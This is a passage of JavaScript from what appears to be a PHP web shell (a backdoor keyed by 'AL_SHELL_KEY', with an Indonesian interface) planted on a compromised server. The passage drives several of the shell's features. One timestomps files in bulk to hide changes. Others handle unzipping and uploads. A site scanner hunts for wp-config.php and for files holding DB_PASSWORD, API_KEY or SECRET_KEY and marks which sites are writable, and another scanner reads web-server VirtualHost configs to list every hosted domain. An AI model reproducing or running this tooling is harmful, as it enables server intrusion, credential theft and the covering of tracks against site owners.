    const files = Array.from(checkboxes).map(cb => cb.value);
    
    try {
        const formData = new FormData();
        formData.append('action', 'timestomp_bulk');
        if (timestamp) formData.append('timestomp_time', timestamp);
        if (referenceFile) formData.append('timestomp_reference', referenceFile);
        formData.append('timestomp_recursive', recursive ? '1' : '0');
        files.forEach(f => formData.append('selected_files[]', f));
        
        statusDiv.textContent = 'Sending request...';
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            totalSpan.textContent = data.total;
            currentSpan.textContent = data.total;
            progressBar.style.width = '100%';
            
            // Sort: success first, then failed
            const sortedItems = data.processed.sort((a, b) => {
                if (a.success === b.success) return 0;
                return a.success ? -1 : 1;
            });
            
            // Build results
            let html = '';
            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;flex-wrap:wrap;">';
            html += '<span class="text-primary">✅ Success: ' + data.success_count + '</span>';
            html += '<span class="text-danger">❌ Failed: ' + data.failed_count + '</span>';
            html += '<span class="text-muted">Total: ' + data.total + '</span>';
            html += '<span class="text-warning">⏰ Applied: ' + escapeHtml(data.timestamp_applied || 'Unknown') + '</span>';
            html += '</div>';
            
            // Show processed items (limited to first 100)
            const displayItems = sortedItems.slice(0, 100);
            displayItems.forEach(item => {
                const icon = item.type === 'dir' ? '📁' : '📄';
                const color = item.success ? '#0f0' : '#f44';
                const status = item.success ? '✓' : '✗';
                const encodedDir = encodeURIComponent(item.dir);
                
                html += '<div class="my-2 text-sm d-flex items-center gap-8">';
                html += '<span class="font-bold min-w-15" style="color:' + color + ';">' + status + '</span>';
                html += '<span class="text-muted">' + icon + '</span>';
                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;flex:1;" ';
                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
                html += escapeHtml(item.path);
                html += '</a>';
                if (item.new_time) {
                    html += '<span class="text-orange text-10">' + escapeHtml(item.new_time) + '</span>';
                }
                html += '</div>';
            });
            
            if (sortedItems.length > 100) {
                html += '<div class="text-muted text-xs mt-10 p-2 bg-main rounded-sm">';
                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
            }
            
            // Show errors if any
            if (data.failed_count > 0) {
                html += '<div class="mt-10 p-4 bg-dark rounded-sm border">';
                html += '<div class="text-danger font-bold mb-8">❌ Failed Items Summary:</div>';
                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
                failedItems.forEach(item => {
                    html += '<div class="text-danger text-xs">• ' + escapeHtml(item.path) + '</div>';
                });
                if (data.failed_count > 20) {
                    html += '<div class="text-muted text-xs mt-4">... and ' + (data.failed_count - 20) + ' more failed</div>';
                }
                html += '</div>';
            }
            
            resultsDiv.innerHTML = html;
            statusDiv.innerHTML = '<span class="text-primary font-bold">✅ Timestomp Completed!</span>';
            
            executeBtn.textContent = '✅ Done';
            closeBtn.textContent = 'Close';
        } else {
            throw new Error(data.errors?.[0] || 'Server returned error');
        }
    } catch (error) {
        resultsDiv.innerHTML = '<div class="text-danger">❌ Error: ' + escapeHtml(error.message) + '</div>';
        statusDiv.innerHTML = '<span class="text-danger">❌ Failed</span>';
        executeBtn.disabled = false;
        executeBtn.textContent = '⏰ Retry';
        closeBtn.textContent = 'Close';
    }
}

function unzipFile(fileName) {
    if (confirm(`Unzip "${fileName}"?`)) {
        const formData = new FormData();
        formData.append('action', 'unzip_file');
        formData.append('unzip_target', fileName);
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
}
function sortTable(columnIndex) {
    const table = document.querySelector(".file-table");
    const tbody = table.querySelector("tbody");
    const rows = Array.from(tbody.querySelectorAll("tr"));
    const headers = table.querySelectorAll("thead th");
    
    // Get current sort state
    const currentSortCol = parseInt(table.dataset.sortCol) || 2;
    let isAscending = table.dataset.sortOrder === 'asc';
    
    // Toggle direction if clicking same column, otherwise default to ascending
    if (currentSortCol === columnIndex) {
        isAscending = !isAscending;
    } else {
        isAscending = true;
    }
    
    table.dataset.sortCol = columnIndex;
    table.dataset.sortOrder = isAscending ? 'asc' : 'desc';
    
    // Update header indicators
    headers.forEach((th, idx) => {
        th.classList.remove('sort-asc', 'sort-desc');
        const indicator = th.querySelector('.sort-indicator');
        if (indicator) indicator.textContent = '';
        
        if (idx === columnIndex) {
            th.classList.add(isAscending ? 'sort-asc' : 'sort-desc');
            if (indicator) indicator.textContent = isAscending ? '↑' : '↓';
        }
    });
    
    rows.sort((a, b) => {
        if (!a.hasAttribute('data-filename')) return -1;
        if (!b.hasAttribute('data-filename')) return 1;
        let aVal = a.children[columnIndex].textContent.trim();
        let bVal = b.children[columnIndex].textContent.trim();
        // Size column (index 4)
        if (columnIndex === 4) {
            if (aVal === '-') aVal = -1;
            else aVal = parseFloat(aVal.replace(' MB', ''));
            if (bVal === '-') bVal = -1;
            else bVal = parseFloat(bVal.replace(' MB', ''));
        } else if (columnIndex === 5) {
            // Modified column (index 5)
            const parseDate = (str) => {
                const parts = str.split(' ');
                const dParts = parts[0].split('-');
                return new Date(`${dParts[2]}-${dParts[1]}-${dParts[0]} ${parts[1]}`).getTime();
            };
            aVal = parseDate(aVal);
            bVal = parseDate(bVal);
        }
        if (aVal < bVal) return isAscending ? -1 : 1;
        if (aVal > bVal) return isAscending ? 1 : -1;
        return 0;
    });
    tbody.innerHTML = "";
    rows.forEach(row => tbody.appendChild(row));
}
(function initDragDropUpload() {
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('uploadFileInput');
    const fileList = document.getElementById('dropFileList');
    const submitBtn = document.getElementById('uploadSubmitBtn');
    const uploadForm = document.getElementById('uploadForm');
    const fileCountSpan = document.getElementById('fileCount');
    if (!dropZone || !fileInput) return;
    let selectedFiles = [];
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, preventDefaults, false);
        document.body.addEventListener(eventName, preventDefaults, false);
    });
    ['dragenter', 'dragover'].forEach(eventName => {
        dropZone.addEventListener(eventName, highlight, false);
    });
    ['dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, unhighlight, false);
    });
    dropZone.addEventListener('drop', handleDrop, false);
    fileInput.addEventListener('change', function() {
        if (this.files.length > 0) {
            handleFiles(Array.from(this.files));
        }
    });
    dropZone.addEventListener('click', function(e) {
        if (e.target.classList.contains('drop-file-remove')) {
            e.stopPropagation();
            const index = parseInt(e.target.dataset.index);
            removeFile(index);
        }
    });
    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }
    function highlight(e) {
        dropZone.classList.add('drag-over');
    }
    function unhighlight(e) {
        dropZone.classList.remove('drag-over');
    }
    function handleDrop(e) {
        var dt = e.dataTransfer;
        if (!dt || !dt.files || dt.files.length === 0) return;
        var droppedFiles = [];
        for (var i = 0; i < dt.files.length; i++) {
            droppedFiles.push(dt.files[i]);
        }
        handleFiles(droppedFiles);
    }
    function handleFiles(files) {
        selectedFiles = selectedFiles.concat(files);
        updateFileList();
    }
    function updateFileList() {
        if (selectedFiles.length === 0) {
            fileList.innerHTML = '';
            submitBtn.disabled = true;
            submitBtn.innerHTML = '📤 Upload <span id="fileCount">0</span> File(s)';
            return;
        }
        let html = '';
        selectedFiles.forEach((file, index) => {
            const fileSize = formatFileSize(file.size);
            html += `
                <div class="drop-file-item">
                    <span class="drop-file-name">${escapeHtml(file.name)}</span>
                    <span class="drop-file-size">${fileSize}</span>
                    <span class="drop-file-remove" data-index="${index}" title="Hapus">❌</span>
                </div>
            `;
        });
        fileList.innerHTML = html;
        submitBtn.disabled = false;
        submitBtn.innerHTML = `📤 Upload ${selectedFiles.length} File(s)`;
    }
    function removeFile(index) {
        selectedFiles.splice(index, 1);
        updateFileList();
    }
    function formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    uploadForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if (selectedFiles.length === 0) return;

        const newFormData = new FormData();
        newFormData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
        newFormData.append('d', <?php echo json_encode($dir) ?>);

        selectedFiles.forEach(function(file) {
            newFormData.append('upload_file[]', file);
        });

        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Uploading...';

        fetch(window.location.href, {
            method: 'POST',
            body: newFormData
        })
        .then(function(response) {
            if (!response.ok) throw new Error('Server error: ' + response.status);
            return response.text();
        })
        .then(function(html) {
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');
            var outputEl = doc.getElementById('outputArea');
            var msg = outputEl ? outputEl.textContent.trim() : '';

            if (msg) {
                alert(msg);
            } else {
                alert('Upload completed!');
            }

            selectedFiles = [];
            updateFileList();
            fileInput.value = '';
            window.location.reload();
        })
        .catch(function(error) {
            alert('Upload failed: ' + error.message);
            submitBtn.disabled = false;
            submitBtn.innerHTML = '📤 Upload ' + selectedFiles.length + ' File(s)';
        });
    });
})();
let currentSearchType = 'filename';
let currentScanMode = 'standard';
let isScanning = false;
function discoverWebsites() {
    openModal('websiteDiscoverModal');
    resetDiscoverModal();
}
function resetDiscoverModal() {
    document.getElementById('websiteDiscoverContent').innerHTML =
        '<div class="discover-placeholder">' +
        '<h3 style="color:var(--primary);margin:8px 0;">Website Discovery</h3>' +
        '<p style="color:var(--text-dim);">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>' +
        '<div style="margin-top:12px;text-align:left;padding:10px;background:var(--bg);border-radius:6px;font-size:12px;">' +
        '<p style="color:var(--primary);margin-bottom:8px;"><strong>Tips Penggunaan:</strong></p>' +
        '<p style="color:var(--text-dim);margin:4px 0;"><strong>Mode Nama File:</strong></p>' +
        '<p style="color:var(--text);margin:2px 0 2px 12px;">index.php, index.html, .htaccess</p>' +
        '<p style="color:var(--text);margin:2px 0 2px 12px;">wp-config.php, configuration.php</p>' +
        '<p style="color:var(--text);margin:2px 0 2px 12px;">*.php, config.* (wildcard)</p>' +
        '<p style="color:var(--text-dim);margin:8px 0 4px;"><strong>Mode Konten:</strong></p>' +
        '<p style="color:var(--text);margin:2px 0 2px 12px;">DB_PASSWORD, username, password</p>' +
        '<p style="color:var(--text);margin:2px 0 2px 12px;">API_KEY, SECRET_KEY, token</p>' +
        '</div></div>';
    document.getElementById('startScanBtn').textContent = 'Mulai Scan';
    document.getElementById('startScanBtn').disabled = false;
    document.getElementById('scanStats').classList.add('hidden');
}
let currentDbConfig = {};
function selectSearchType(type) {
    currentSearchType = type;
    document.querySelectorAll('.search-type').forEach(el => el.classList.remove('active'));
    document.querySelector('.search-type[data-type="' + type + '"]').classList.add('active');
    const patternInput = document.getElementById('searchPattern');
    const hintText = document.getElementById('patternHint');
    if (type === 'filename') {
        patternInput.placeholder = 'index.php, index.html, .htaccess';
        hintText.textContent = 'Contoh: *.php, config.*, wp-config.php';
        patternInput.value = 'index.php, index.html, .htaccess';
    } else {
        patternInput.placeholder = 'DB_PASSWORD, username, api_key';
        hintText.textContent = 'Cari file yang mengandung string ini';
        patternInput.value = 'DB_PASSWORD, password, username';
    }
}
function selectScanMode(mode) {
    currentScanMode = mode;
    document.querySelectorAll('.scan-mode').forEach(el => el.classList.remove('active'));
    document.querySelector('.scan-mode[data-mode="' + mode + '"]').classList.add('active');
}
// 🚀 STREAMING WEBSITE SCAN dengan real-time progress
async function startWebsiteScan() {
    if (isScanning) return;
    const patternInput = document.getElementById('searchPattern').value.trim();
    const customPath = document.getElementById('customPath')?.value.trim() || '';
    const useCache = document.getElementById('useCache')?.checked || false;
    
    if (!patternInput) {
        alert('Masukkan pattern pencarian!');
        return;
    }
    
    isScanning = true;
    const content = document.getElementById('websiteDiscoverContent');
    const startTime = Date.now();
    const statsDiv = document.getElementById('scanStats');
    const timeSpan = document.getElementById('scanTime');
    const countSpan = document.getElementById('scanCount');
    const statusSpan = document.getElementById('scanStatus');
    const scannedSpan = document.getElementById('scannedCount');
    const extractTitle = document.getElementById('extractTitle').checked;
    const showPreview = document.getElementById('showPreview').checked;
    
    document.getElementById('startScanBtn').disabled = true;
    document.getElementById('startScanBtn').textContent = '⏳ Scanning...';
    statsDiv.style.display = 'block';
    statusSpan.textContent = 'Initializing...';
    
    // Results container with live update
    const results = [];
    let totalScanned = 0;
    
    content.innerHTML =
        '<div id="liveResults" style="padding:8px;">' +
        '<div id="scanningMsg" style="color:var(--info);text-align:center;padding:16px;">' +
        'Scanning in progress... <span id="liveCount">0</span> found' +
        '</div>' +
        '<div id="resultsList"></div>' +
        '</div>';
    
    const timerInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        timeSpan.textContent = elapsed + 's';
    }, 1000);
    
    const params = new URLSearchParams();
    params.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    params.append('action', 'discover_websites');
    params.append('mode', currentScanMode);
    params.append('search_type', currentSearchType);
    params.append('pattern', patternInput);
    params.append('extract_title', extractTitle ? '1' : '0');
    params.append('show_preview', showPreview ? '1' : '0');
    params.append('max_results', '1000');
    if (customPath) params.append('custom_path', customPath);
    if (useCache) params.append('use_cache', '1');
    
    try {
        const response = await fetch('?' + params.toString());
        if (!response.ok) throw new Error('HTTP ' + response.status);
        
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer = '';
        
        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            
            buffer += decoder.decode(value, { stream: true });
            const lines = buffer.split('\n');
            buffer = lines.pop(); // Keep incomplete line in buffer
            
            for (const line of lines) {
                if (!line.trim()) continue;
                try {
                    const item = JSON.parse(line);
                    
                    if (item.type === 'progress') {
                        totalScanned = item.scanned || totalScanned;
                        if (scannedSpan) scannedSpan.textContent = totalScanned.toLocaleString();
                        statusSpan.textContent = 'Scanning: ' + (item.current_path || '...');
                    }
                    else if (item.type === 'result') {
                        results.push(item.data);
                        document.getElementById('liveCount').textContent = results.length;
                        countSpan.textContent = results.length;
                        // Add live preview of latest result
                        appendLiveResult(item.data, currentSearchType);
                    }
                    else if (item.type === 'cache') {
                        // Use cached results
                        results.push(...item.data);
                        document.getElementById('liveCount').textContent = results.length;
                        countSpan.textContent = results.length;
                        statusSpan.textContent = 'Loaded from cache';
                    }
                    else if (item.type === 'complete') {
                        totalScanned = item.scanned || totalScanned;
                        if (scannedSpan) scannedSpan.textContent = totalScanned.toLocaleString();
                        statusSpan.textContent = item.status === 'max_reached' ? 'Max results reached' : 'Complete';
                    }
                } catch (e) {
                    console.error('Parse error:', e, line);
                }
            }
        }
        
        clearInterval(timerInterval);
        isScanning = false;
        
        if (results.length === 0) {
            content.innerHTML = '<p style="color:var(--danger);text-align:center;padding:40px;">Tidak ditemukan.</p>';
        } else {
            statusSpan.textContent = 'Rendering...';
            if (currentSearchType === 'filename') {
                renderFilenameResults(results, content);
            } else {
                renderContentResults(results, content);
            }
        }
        
        document.getElementById('startScanBtn').textContent = 'Mulai Scan Ulang';
        document.getElementById('startScanBtn').disabled = false;
        
    } catch (error) {
        clearInterval(timerInterval);
        isScanning = false;
        console.error('Scan error:', error);
        content.innerHTML = '<div style="color:var(--danger);padding:20px;text-align:center;">' +
            '<p>Error: ' + escapeHtml(error.message) + '</p></div>';
        document.getElementById('startScanBtn').textContent = 'Retry';
        document.getElementById('startScanBtn').disabled = false;
    }
}

// Append live result during scan
function appendLiveResult(data, type) {
    const list = document.getElementById('resultsList');
    if (!list) return;

    const div = document.createElement('div');
    div.style.cssText = 'padding:8px;margin:4px 0;background:var(--bg-panel);border:1px solid var(--border);border-radius:4px;font-size:12px;';

    if (type === 'filename') {
        const cmsType = data.type || 'Unknown';
        const wpClass = cmsType === 'WordPress' ? 'wordpress' : (cmsType === 'Joomla' ? 'joomla' : (cmsType === 'Magento' ? 'magento' : (cmsType === 'Drupal' ? 'drupal' : '')));
        div.innerHTML = '<span class="cms-badge ' + wpClass + '">' + escapeHtml(cmsType) + '</span> ' +
            '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(data.path) + '" style="color:var(--primary);text-decoration:none;">' +
            escapeHtml(data.path) + '</a>';
    } else {
        div.innerHTML = '<span style="color:var(--warn);">' + escapeHtml(data.path) + '</span>';
    }

    list.insertBefore(div, list.firstChild);
    while (list.children.length > 10) {
        list.removeChild(list.lastChild);
    }
}

// 🔥 VIRTUALHOST SCANNER - Find Apache/Nginx domains
try {
    scanVirtualHosts = async function(serverType) {
        const content = document.getElementById('websiteDiscoverContent');
        const statsDiv = document.getElementById('scanStats');
        
        content.innerHTML = '<div style="padding:20px;text-align:center;">' +
            '<div style="color:var(--info);font-size:14px;margin-bottom:8px;">Scanning ' + (serverType === 'all' ? 'All Web Servers' : serverType.toUpperCase()) + '...</div>' +
            '<div style="color:var(--text-dim);font-size:14px;">Mencari konfigurasi VirtualHost...</div>' +
            '<div style="margin-top:12px;color:var(--text-dim);font-size:11.5px;">Path: /etc/apache2/sites-available /etc/nginx/sites-enabled</div>' +
            '</div>';
        
        statsDiv.style.display = 'block';
        document.getElementById('scanStatus').textContent = 'Scanning VirtualHosts...';
        
        try {
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_virtualhosts&server_type=' + serverType);
            
            // Check if response is OK
            if (!response.ok) {
                throw new Error('HTTP Error: ' + response.status + ' ' + response.statusText);
            }
            
            // Get response text first
            const responseText = await response.text();
            
            // Check if response is empty
            if (!responseText || responseText.trim() === '') {
                throw new Error('Server returned empty response. Command may be blocked by server.');
            }
            
            // Try to parse JSON
            let data;
            try {
                data = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON Parse Error:', parseError);
                console.error('Response Text:', responseText.substring(0, 500));
                throw new Error('Invalid JSON response. Server may have blocked the command or returned error.');
            }
            
            if (!data.success) {
                const errorMsg = data.error || 'Scan failed';
                const details = data.details || '';
                throw new Error(errorMsg + (details ? ' (' + details + ')' : ''));
            }
            
            // Combine all results
            let allVhosts = [];
            
            if (data.apache && data.apache.length > 0) {
                data.apache.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: vhost.aliases || [],
                        server: 'Apache',
                        listen: vhost.listen || '80/443'
                    });
                });
            }
            
            if (data.nginx && data.nginx.length > 0) {
                data.nginx.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: [],
                        server: 'Nginx',
                        listen: vhost.listen || '80'
                    });
                });
            }
            
            if (data.litespeed && data.litespeed.length > 0) {
                data.litespeed.forEach(vhost => {
                    allVhosts.push({
                        domain: vhost.domain,
                        docroot: vhost.docroot,
                        aliases: [],
                        server: 'LiteSpeed',
                        listen: vhost.listen || '80/443'
                    });
                });
            }
            
            // Remove duplicates by domain
            const seen = new Set();
            allVhosts = allVhosts.filter(vhost => {
                const duplicate = seen.has(vhost.domain);
                seen.add(vhost.domain);
                return !duplicate;
            });
            
            // Update stats
            document.getElementById('scanCount').textContent = allVhosts.length;
            document.getElementById('scanStatus').textContent = 'Selesai!';
            
            if (allVhosts.length === 0) {
                content.innerHTML = '<div style="padding:20px;text-align:center;">' +
                    '<div style="color:var(--danger);font-size:14px;margin-bottom:8px;">Tidak ditemukan VirtualHost</div>' +
                    '<div style="color:var(--text-dim);font-size:14px;">Mungkin web server tidak terinstall atau path berbeda</div>' +
                    '</div>';
                return;
            }
            
            // Render results
            renderVirtualHostResults(allVhosts, content, data);
            
        } catch (error) {
            let errorHtml = '<div style="color:var(--danger);padding:20px;text-align:center;border:1px solid var(--danger);border-radius:6px;background:rgba(255,60,60,.05);">';
            errorHtml += '<p style="font-weight:bold;font-size:12px;">Error: ' + escapeHtml(error.message) + '</p>';
            errorHtml += '<div style="margin-top:12px;text-align:left;background:var(--bg);padding:10px;border-radius:4px;">';
            errorHtml += '<p style="font-size:11.5px;color:var(--warn);margin-bottom:6px;">Kemungkinan penyebab:</p>';
            errorHtml += '<ul style="font-size:10.5px;color:var(--text-dim);margin:0;padding-left:16px;">';
            errorHtml += '<li>Shell execution functions (shell_exec, exec, system) disabled</li>';
            errorHtml += '<li>SELinux/AppArmor blocking commands</li>';
            errorHtml += '<li>WAF/IDS blocking the request</li>';
            errorHtml += '<li>Insufficient permissions to read config files</li>';
            errorHtml += '<li>Web server configuration not in standard paths</li>';
            errorHtml += '</ul></div>';
            errorHtml += '<p style="font-size:10.5px;color:var(--text-dim);margin-top:8px;">Coba jalankan command manual via shell untuk verifikasi</p>';
            errorHtml += '</div>';
            
            content.innerHTML = errorHtml;
            document.getElementById('scanStatus').textContent = 'Error: ' + error.message.substring(0, 50) + '...';
        }
    };
} catch (e) {
    // Function already defined
}

function renderVirtualHostResults(vhosts, content, scanData) {
    // Sort by server type then domain
    vhosts.sort((a, b) => {
        if (a.server !== b.server) return a.server.localeCompare(b.server);
        return a.domain.localeCompare(b.domain);
    });
    
    const apacheCount = vhosts.filter(v => v.server === 'Apache').length;
    const nginxCount = vhosts.filter(v => v.server === 'Nginx').length;
    const litespeedCount = vhosts.filter(v => v.server === 'LiteSpeed').length;
    
    // Get distro info from scan data
    const distroText = scanData && scanData.distro === 'debian' ? 'Debian/Ubuntu' :
                      scanData && scanData.distro === 'rhel' ? 'CentOS/RHEL' : 'Unknown';
    
    let html = '<div style="background:var(--ok);color:#000;padding:14px;border-radius:6px;margin-bottom:12px;text-align:center;">';
    html += '<strong style="font-size:14px;">' + vhosts.length + ' VirtualHost Ditemukan!</strong>';
    html += '<div style="font-size:11.5px;margin-top:4px;color:#1a1a1a;">Distro: ' + distroText + '</div>';
    html += '<div style="font-size:12px;margin-top:6px;">';
    if (apacheCount > 0) html += '<span style="margin-right:8px;">Apache: ' + apacheCount + '</span>';
    if (nginxCount > 0) html += '<span style="margin-right:8px;">Nginx: ' + nginxCount + '</span>';
    if (litespeedCount > 0) html += '<span>LiteSpeed: ' + litespeedCount + '</span>';
    html += '</div></div>';
    
    // Group by server type
    const grouped = {};
    vhosts.forEach(vhost => {
        if (!grouped[vhost.server]) grouped[vhost.server] = [];
        grouped[vhost.server].push(vhost);
    });
    
    // Render each group
    Object.keys(grouped).forEach(serverType => {
        const serverVhosts = grouped[serverType];
        const serverColors = {
            'Apache': '#f80',
            'Nginx': '#0f0',
            'LiteSpeed': '#f0f'
        };
        const serverIcons = {
            'Apache': '🔴',
            'Nginx': '🟢',
            'LiteSpeed': '🟣'
        };
        const serverColor = serverColors[serverType] || '#6cf';
        const serverIcon = serverIcons[serverType] || '⚪';
        
        html += '<div style="margin-bottom:16px;">';
        html += '<div style="background:var(--bg-panel);padding:8px 12px;margin-bottom:8px;border-left:4px solid ' + serverColor + ';border-radius:4px;">';
        html += '<strong style="font-size:12px;color:' + serverColor + ';">' + serverIcon + ' ' + serverType + ' (' + serverVhosts.length + ')</strong>';
        html += '</div>';

        serverVhosts.forEach(function(vhost, index) {
            var encodedPath = encodeURIComponent(vhost.docroot);
            var shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
            var webUrl = 'http://' + vhost.domain;
            var hasDocroot = vhost.docroot && vhost.docroot !== '';

            html += '<div class="website-item">';
            html += '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px;">';
            html += '<div style="flex:1;">';
            html += '<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">';
            html += '<span style="color:var(--primary);font-weight:bold;">#' + (index + 1) + '</span>';
            html += '<a href="' + webUrl + '" target="_blank" style="color:var(--ok);font-weight:bold;font-size:12px;text-decoration:none;">' + escapeHtml(vhost.domain) + '</a>';
            html += '<span style="background:' + serverColor + ';color:#000;padding:2px 8px;border-radius:3px;font-size:10.5px;font-weight:bold;">' + serverType + '</span>';
            if (vhost.listen) {
                html += '<span style="background:var(--border);color:var(--text-dim);padding:2px 8px;border-radius:3px;font-size:10.5px;">Port: ' + vhost.listen + '</span>';
            }
            html += '</div></div></div>';

            if (hasDocroot) {
                html += '<div style="margin-top:6px;padding:6px 8px;background:var(--bg);border-radius:4px;">';
                html += '<div style="font-size:10.5px;color:var(--text-dim);margin-bottom:2px;">Document Root:</div>';
                html += '<a href="' + shellUrl + '" target="_blank" style="color:var(--info);font-family:var(--mono);font-size:12px;text-decoration:none;word-break:break-all;">' + escapeHtml(vhost.docroot) + '</a>';
                html += '</div>';
            } else {
                html += '<div style="margin-top:6px;padding:6px 8px;background:rgba(255,60,60,.05);border-radius:4px;color:var(--danger);font-size:11.5px;">Document root tidak ditemukan</div>';
            }

            if (vhost.aliases && vhost.aliases.length > 0) {
                html += '<div style="margin-top:4px;font-size:10.5px;color:var(--text-dim);">Aliases: ' + vhost.aliases.map(function(a){ return '<span style="color:var(--warn);">' + escapeHtml(a) + '</span>'; }).join(', ') + '</div>';
            }

            html += '<div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;">';
            html += '<a href="' + webUrl + '" target="_blank" style="padding:4px 12px;font-size:11.5px;background:var(--ok);color:#000;text-decoration:none;border-radius:4px;font-weight:bold;">Buka Web</a>';
            if (hasDocroot) {
                html += '<a href="' + shellUrl + '" target="_blank" style="padding:4px 12px;font-size:11.5px;background:var(--info);color:#000;text-decoration:none;border-radius:4px;font-weight:bold;">Buka Folder</a>';
            }
            html += '</div>';
            html += '</div>';
        });

        html += '</div>';
    });
    
    content.innerHTML = html;
}

function navigateToDir(path) {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(path);
}
function renderFilenameResults(data, content) {
    data.sort((a, b) => {
        if (a.has_title && !b.has_title) return -1;
        if (!a.has_title && b.has_title) return 1;
        return a.path.localeCompare(b.path);
    });
    let html = '<div style="background:var(--ok);color:#000;padding:12px;border-radius:6px;margin-bottom:12px;text-align:center;font-size:12px;">';
    html += '<strong>Ditemukan ' + data.length + ' website!</strong>';
    html += '<div style="font-size:12px;margin-top:4px;color:#1a1a1a;">';
    html += 'Dengan title: ' + data.filter(s => s.title).length + ' | ';
    html += 'Writable: ' + data.filter(s => s.writable).length;
    html += '</div></div>';
    data.forEach((site, index) => {
        const hasTitle = site.title ? true : false;
        const priorityClass = hasTitle ? 'priority' : '';
        const titleBadge = hasTitle
            ? '<span class="website-badge badge-title">TITLE FOUND</span>'
            : '';
        const writableBadge = site.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const typeColor = site.type === 'WordPress' ? '#ff0' :
                         site.type === 'Laravel' ? '#f0f' :
                         site.type === 'Static HTML' ? '#6cf' : 'var(--primary)';
        const encodedPath = encodeURIComponent(site.path);
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
        html += '<div class="website-item ' + priorityClass + '">' +
            '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;">' +
            '<div style="flex:1;">' +
            '<div style="display:flex;align-items:center;flex-wrap:wrap;gap:4px;">' +
            '<span style="color:var(--primary);font-weight:bold;">#' + (index + 1) + '</span> ' +
            '<span style="color:' + typeColor + ';font-weight:bold;">' + escapeHtml(site.type) + '</span> ' +
            writableBadge + ' ' + titleBadge +
            '</div>' +
            (hasTitle ? '<div class="website-title">' + escapeHtml(site.title) + '</div>' : '') +
            '</div>' +
            '<a href="' + shellUrl + '" target="_blank" style="padding:5px 12px;font-size:11.5px;background:var(--primary);color:#000;text-decoration:none;border-radius:4px;font-weight:bold;white-space:nowrap;margin-left:8px;">Buka</a>' +
            '</div>' +
            '<div class="website-path">' + escapeHtml(site.path) + '</div>' +
            '<div class="website-meta">' +
            '<span>Marker: ' + escapeHtml(site.marker) + '</span>' +
            '<span>' + escapeHtml(site.size) + '</span>' +
            '<span>' + (site.writable ? 'Writable' : 'Read-only') + '</span>' +
            '</div></div>';
    });
    content.innerHTML = html;
}
function renderContentResults(data, content) {
    let html = '<div style="background:var(--warn);color:#000;padding:12px;border-radius:6px;margin-bottom:12px;text-align:center;font-size:12px;">';
    html += '<strong>Ditemukan ' + data.length + ' file dengan konten cocok!</strong>';
    html += '<div style="font-size:12px;margin-top:4px;color:#1a1a1a;">';
    html += 'Writable: ' + data.filter(s => s.writable).length + ' | Total matches: ' + data.reduce((acc, s) => acc + s.matches.length, 0);
    html += '</div></div>';
    data.forEach((file, index) => {
        const writableBadge = file.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(dirname(file.path));
        html += '<div class="website-item">' +
            '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;">' +
            '<div style="flex:1;">' +
            '<div style="display:flex;align-items:center;flex-wrap:wrap;gap:4px;">' +
            '<span style="color:var(--primary);font-weight:bold;">#' + (index + 1) + '</span> ' +
            '<span style="color:var(--warn);font-weight:bold;">' + escapeHtml(file.type) + '</span> ' +
            writableBadge +
            '</div></div>' +
            '<a href="' + shellUrl + '" target="_blank" style="padding:5px 12px;font-size:11.5px;background:var(--primary);color:#000;text-decoration:none;border-radius:4px;font-weight:bold;white-space:nowrap;margin-left:8px;">Dir</a>' +
            '</div>' +
            '<div class="website-path">' + escapeHtml(file.path) + '</div>' +
            '<div style="margin-top:8px;">' +
            '<p style="color:var(--info);font-size:11.5px;margin-bottom:4px;">Pattern cocok:</p>' +
            file.matches.map(m =>
